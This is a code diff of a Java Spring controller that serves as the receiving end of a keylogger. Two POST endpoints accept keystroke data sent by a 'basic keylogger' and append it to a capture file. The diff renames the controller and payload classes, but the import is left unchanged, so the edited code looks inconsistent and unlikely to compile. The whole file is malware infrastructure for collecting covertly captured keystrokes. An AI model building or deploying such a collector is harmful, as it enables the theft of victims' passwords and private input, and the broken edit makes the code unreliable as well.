@@ -1,6 +1,6 @@
 package com.aetriks.relay.controller;
 
-import com.aetriks.relay.model.KeylogPayload;
+import com.aetriks.relay.model.KeylogPayload; 
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.RestController;
 import org.springframework.web.bind.annotation.GetMapping;
@@ -12,7 +12,7 @@ import java.nio.file.Files;
 import java.nio.file.Paths;
 
 @RestController
-public class KeylogController {
+public class KeyLogController {
 
     private static final String FILE_PATH = "keyboard_capture.txt";
 
@@ -30,13 +30,13 @@ public class KeylogController {
 
     // POST – append keylog data from basic keylogger
     @PostMapping("/")
-    public ResponseEntity<String> logKeys(@RequestBody KeylogPayload payload) {
+    public ResponseEntity<String> logKeys(@RequestBody KeyLogPayload payload) {
         return appendToFile(payload.getKeyboardData());
     }
 
     // POST – same as above but from specific /api/keystrokes endpoint
     @PostMapping("/api/keystrokes")
-    public ResponseEntity<?> logKeysApi(@RequestBody KeylogPayload payload) {
+    public ResponseEntity<?> logKeysApi(@RequestBody KeyLogPayload payload) {
         ResponseEntity<String> result = appendToFile(payload.getKeyboardData());
         if (result.getStatusCode().is2xxSuccessful()) {
             return ResponseEntity.ok().body("{\"message\": \"Successfully logged the data.\", \"stop\": false}");
